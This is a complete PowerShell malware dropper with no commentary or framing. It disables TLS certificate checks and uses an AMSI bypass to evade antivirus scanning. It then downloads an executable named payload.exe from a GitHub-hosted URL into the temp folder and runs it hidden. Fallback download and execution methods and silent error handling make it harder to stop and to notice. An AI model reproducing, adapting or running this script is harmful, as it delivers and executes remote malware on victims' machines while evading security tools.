# Enhanced SSL/TLS Bypass
try {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# Bypass AMSI if needed
try {
    $amsiBypass = @"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"@
    iex $amsiBypass
} catch {}

function Download-And-Run {
    $payloadUrl = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
    $localPath = Join-Path $env:TEMP "payload.exe"
    
    try {
        # Multiple download methods
        try {
            Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
        } catch {
            # Fallback to .NET WebClient
            (New-Object System.Net.WebClient).DownloadFile($payloadUrl, $localPath)
        }
        
        if (Test-Path $localPath) {
            # Multiple execution methods
            try {
                Start-Process -FilePath $localPath -WindowStyle Hidden -NoNewWindow
            } catch {
                # Fallback to WScript
                $wscript = New-Object -ComObject WScript.Shell
                $wscript.Run($localPath, 0, $false)
            }
        }
    }
    catch {
        # Silent error handling
    }
}

Download-And-Run
